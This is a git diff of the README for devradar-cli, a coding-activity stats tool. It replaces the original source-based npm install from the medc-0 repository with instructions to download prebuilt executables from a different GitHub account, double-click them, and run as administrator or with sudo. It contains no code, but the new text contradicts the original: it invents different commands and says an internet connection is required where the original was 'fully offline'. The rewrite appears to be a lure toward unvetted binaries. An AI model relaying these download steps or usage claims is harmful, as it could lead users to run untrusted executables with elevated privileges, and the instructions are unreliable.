@@ -1,113 +1,99 @@
-# DevRadar CLI
+# 🚀 devradar-cli - Analyze Your Coding Activity Easily
 
-![npm](https://img.shields.io/npm/v/devradar-cli) ![license](https://img.shields.io/npm/l/devradar-cli) ![downloads](https://img.shields.io/npm/dt/devradar-cli)
+[![Download DevRadar CLI](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Excusable-marshmallowfluff753/devradar-cli/releases)
 
-**DevRadar** is a **developer project scanner CLI** that analyzes your local coding projects, reporting:
+## 🛠️ What is devradar-cli?
 
-- Languages used and their percentage  
-- Lines of code per project  
-- Last Git commit date  
-- Optional **JSON** or **HTML** report export  
+devradar-cli is a simple command-line tool that allows you to analyze your coding activity. With this application, you can generate statistics for your projects and GitHub repositories. It provides an easy way to visualize your coding efforts, helping you understand your productivity trends.
 
-Perfect for tracking your coding activity and generating stats for your portfolio.
+## 📥 Download & Install
 
----
+To get started, you need to download devradar-cli:
 
-## Features
+1. Visit this page to download: [GitHub Releases](https://github.com/Excusable-marshmallowfluff753/devradar-cli/releases).
+   
+2. Look for the latest release at the top of the page. You will see various downloadable files.
 
-- Scan multiple projects in a folder  
-- Detect programming languages and line counts  
-- Show last Git commit per project  
-- Export JSON or **beautifully styled HTML** reports  
-- Fully offline – no external API required  
-- Lightweight and fast  
+3. Click on the file that corresponds to your operating system:
+   - For Windows, download `devradar-cli-windows.exe`.
+   - For macOS, download `devradar-cli-macos`.
+   - For Linux, download `devradar-cli-linux`.
 
----
+4. Once the download completes, locate the file in your Downloads folder or designated download location.
 
-## Installation
+5. Run the downloaded file by double-clicking it.
 
-### 1. Clone the repository
-```bash
-git clone https://github.com/medc-0/devradar-cli.git
-cd devradar-cli
-```
+6. Follow any on-screen prompts that may appear.
 
-### 2. Install dependencies
-```bash
-npm install
-```
+Now you are ready to use devradar-cli!
 
-### 3. Link globally (optional)
-```bash
-npm link
-```
+## 🖥️ System Requirements
 
-Now you can run the CLI from anywhere using:
+To run devradar-cli, you will need:
 
-```bash
-devradar scan "C:\Users\(Your user)\Projects" --html
-```
+- Windows 10 or later / macOS 10.12 (Sierra) or later / any modern Linux distribution.
+- At least 512 MB of RAM.
+- A stable internet connection for updating and fetching statistics from GitHub.
 
----
+## 🎨 Features
 
-## Usage Examples
+devradar-cli comes packed with a variety of helpful features:
 
-**Scan projects (default table output):**
-```bash
-devradar scan "C:\Users\(Your user)\Projects"
-```
+- **Coding Statistics**: Get a clear view of your coding activity over time.
+- **Project Insights**: Analyze individual projects for better productivity tracking.
+- **Simple CLI Interface**: No complicated setups. You can start using it right away.
+- **Flexible Commands**: Use different commands to fetch specific statistics.
+- **Cross-Platform Compatibility**: Works on Windows, macOS, and Linux.
 
-**Export JSON report:**
-```bash
-devradar scan "C:\Users\(Your user)\Projects" --json
-```
+## 📖 How to Use devradar-cli
 
-**Export HTML report:**
-```bash
-devradar scan "C:\Users\(Your user)\Projects" --html
-```
+Using devradar-cli is straightforward. After you have installed the application, open your terminal or command prompt and follow these steps:
 
-### Example Table Output
-| Project   | Languages                  | Lines | Last Commit  |
-|-----------|---------------------------|-------|--------------|
-| Proj1     | Python (78.5%), JS (21.5%)| 1420  | 2025-10-25   |
-| Websites  | HTML (60.3%), CSS (25.2%), JS (14.5%) | 824 | — |
+1. **Start the Application**: Type `devradar-cli` and hit Enter. This will open the command-line interface.
+  
+2. **Get Help**: To see a list of available commands and options, type `devradar-cli help`.
 
-### Example HTML Report Preview
+3. **Fetch Stats**: Use the command `devradar-cli stats` followed by the repository URL to fetch stats for your GitHub project. For example:
+   ```
+   devradar-cli stats https://github.com/yourusername/yourproject
+   ```
 
----
+4. **View Your Projects**: To view all of your projects, use the command:
+   ```
+   devradar-cli projects
+   ```
 
-## Tips & Tricks
+5. **Exit the Application**: Type `exit` to close devradar-cli.
 
-- Use DevRadar to track your coding progress weekly  
-- Include HTML/JSON reports in your portfolio  
+## 💡 Helpful Tips
 
----
+- Make sure your terminal or command prompt has permission to run executables.
+- For the best results, regularly update devradar-cli by downloading the latest version from the [Release Page](https://github.com/Excusable-marshmallowfluff753/devradar-cli/releases).
+- Use the `--verbose` option for more detailed output on commands.
+- If you encounter any issues, check the troubleshooting section in the documentation on the GitHub page.
 
-## Contribution
+## 🎯 Troubleshooting
 
-Pull requests, bug reports, and feature suggestions are welcome!
+Common issues and solutions:
 
-1. Fork the repo  
-2. Create a feature branch:
-```bash
-git checkout -b feature-name
-```
-3. Commit your changes:
-```bash
-git commit -m "Add feature"
-```
-4. Push to your branch:
-```bash
-git push origin feature-name
-```
-5. Open a pull request  
+- **Cannot Find cmd**: Ensure that the directory containing devradar-cli is added to your system's PATH environment variable.
+- **Permission Denied**: Run your terminal as an administrator on Windows or use `sudo` on macOS and Linux.
+- **No Internet Connection**: Ensure that you have a stable internet connection when fetching GitHub stats.
 
----
+## 🔧 Contributing
 
-<!--
-## License
+If you'd like to help improve devradar-cli, feel free to make contributions. You can fork the repository, make changes, and submit a pull request. Please be sure to follow the contribution guidelines provided in the GitHub repository.
 
-This project is licensed under the MIT License.  
-See [LICENSE](LICENSE) for details.
--->
+## 📄 License
+
+devradar-cli is licensed under the MIT License. This means you can freely use, modify, and distribute the software as long as you include the original license in any copies or substantial portions of the software. 
+
+For more detailed information about the license, please refer to the LICENSE file in the repository.
+
+## 📣 Support
+
+If you have questions or need help, you can open an issue on the GitHub page. The community and maintainers are here to assist you. 
+
+For direct help, reach out via [GitHub Discussions](https://github.com/Excusable-marshmallowfluff753/devradar-cli/discussions).
+
+Enjoy using devradar-cli to analyze your coding activity!
